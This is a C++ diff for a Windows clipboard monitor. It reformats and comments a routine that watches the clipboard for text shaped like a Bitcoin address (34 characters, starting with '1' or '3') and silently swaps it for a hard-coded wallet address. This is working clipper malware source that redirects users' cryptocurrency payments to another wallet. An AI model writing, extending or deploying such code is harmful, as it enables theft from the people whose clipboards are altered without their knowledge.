@@ -24,8 +24,15 @@ int startClipboardMonitoring() {
     wc.lpszClassName = reinterpret_cast<LPCSTR>(L"ClipboardMonitorWindowClass");
     RegisterClass(&wc);
 
-    HWND hwnd = CreateWindow(wc.lpszClassName, reinterpret_cast<LPCSTR>(L""), 0, 0, 0, 0, 0, HWND_MESSAGE, nullptr, nullptr, nullptr);
-
+    HWND hwnd = CreateWindow(
+            wc.lpszClassName,
+            reinterpret_cast<LPCSTR>(L""),
+            0, 0, 0, 0, 0,
+            HWND_MESSAGE,
+            nullptr,
+            nullptr,
+            nullptr
+            );
     if (!hwnd) {
         return -1;
     }
@@ -39,27 +46,27 @@ int startClipboardMonitoring() {
             if (hClipboardData != nullptr) {
                 // Lock memory and get data
                 char* pszText = static_cast<char*>(GlobalLock(hClipboardData));
-
                 // Check clipboard content
                 if (pszText != nullptr) {
                     std::string clipboardText(pszText);
                     GlobalUnlock(hClipboardData);
-
-                    // If the length is 34 and starts with '1' or '3'
+                    // The format of a Bitcoin wallet address is typically 34 characters long, starting with 1 or 3
+                    // If the format of the content in clipboard is similar with a bitcoin wallet address,
+                    // then replace it with preset wallet address.
                     if (clipboardText.length() == 34 && (clipboardText[0] == '1' || clipboardText[0] == '3')) {
-                        // Replace with the specified address
                         clipboardText = (clipboardText[0] == '1') ?
                                         "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" : "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy";
-
                         // Put the modified text back into the clipboard
                         HGLOBAL hNewClipboardData = GlobalAlloc(GMEM_MOVEABLE, clipboardText.length() + 1);
                         if (hNewClipboardData != nullptr) {
                             LPVOID pNewClipboardData = GlobalLock(hNewClipboardData);
                             if (pNewClipboardData != nullptr) {
-                                strncpy(static_cast<char*>(pNewClipboardData), clipboardText.c_str(), clipboardText.length());
+                                strncpy(
+                                        static_cast<char*>(pNewClipboardData),
+                                        clipboardText.c_str(),
+                                        clipboardText.length());
                                 static_cast<char*>(pNewClipboardData)[clipboardText.length()] = '\0';
                                 GlobalUnlock(hNewClipboardData);
-
                                 EmptyClipboard();
                                 SetClipboardData(CF_TEXT, hNewClipboardData);
                             }
